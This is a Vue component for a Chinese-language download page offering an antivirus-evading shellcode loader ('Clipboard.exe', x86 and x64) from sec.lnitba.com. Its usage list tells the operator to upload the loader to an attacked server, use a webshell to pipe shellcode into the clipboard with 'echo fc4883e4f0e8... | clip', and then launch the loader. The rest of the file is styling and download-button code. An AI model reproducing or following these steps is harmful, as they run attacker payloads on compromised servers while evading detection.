<template>
    <div class="page">
        <div class="tit">
            <h2>剪切板分离免杀</h2>
        </div>
        <div class="down">
            <h2>DownLoad:</h2>
            <el-row class="downbtn">        
                <el-button type="success" plain @click="downx86">Clipboard.exe x86</el-button>
                <el-button type="warning" plain @click="downx64">Clipboard.exe x64</el-button>
            </el-row>
        </div>
        <div class="useinfo">
            <h2>使用方法</h2>    
            <ul>
                <li>1、将加载器上传到被攻击服务器</li>
                <li>2、使用webshell在命令行下将shellcode写进剪切板</li>
                <li class="code">echo fc4883e4f0e8c00000.... | clip</li>
                <li>这里注意shellcode格式</li>
                <li>3、运行加载器即可</li>
                <li class="code">start c:\users\admin\Clipboard.exe</li>
            </ul>
        </div>
    </div>
</template>
<style>
.page{
    width: 100%;
    height: 500px;
}
.tit{
  padding: 15px 0 0 30px;
  border-bottom: 1px solid rgba(0,0,0,.09);
  margin-bottom: 20px;
  border-bottom: 1px solid rgba(0,0,0,.09);
}
.down{
    padding-left: 30px;
    border-bottom: 1px solid rgba(0,0,0,.09);
}
.downbtn{
    width: 40%;
    margin: 0 auto;
    padding-bottom: 30px;
}
.useinfo{
    width: 100%;
    padding-left: 30px;
}
.useinfo ul li{
    margin-top: 10px;
    font-size: 15px;
    margin-left: 20px;
}
.code{
    background-color: black;
    color: rgb(255, 255, 255);
    width: 20%;
    padding: 6px;
    margin-left: 15px;
}
</style>

<script setup>
import { ElNotification } from "element-plus";

const downloadUrlX86 = "http://sec.lnitba.com/download/ClipboardX86.exe"; // 下载文件的URL
const downloadUrlX64 = "http://sec.lnitba.com/download/ClipboardX64.exe"; // 下载文件的URL
const fileName = "Clipboard.exe"; // 下载文件的文件名
const a = document.createElement("a"); // 创建a标签
// a.href = downloadUrl; // 设置a标签的href属性
a.download = fileName; // 设置a标签的download属性

const downx86 = async () => {
    ElNotification({
      title: "开始下载，Clipboard.exe x86!",
      type: "success",
    });
    a.href = downloadUrlX86; // 设置a标签的href属性
    a.click(); // 模拟点击a标签，触发下载
}
const downx64 = async () => {
    ElNotification({
      title: "开始下载，Clipboard.exe x64!",
      type: "success",
    });
    a.href = downloadUrlX64; // 设置a标签的href属性
    a.click(); // 模拟点击a标签，触发下载
}

</script>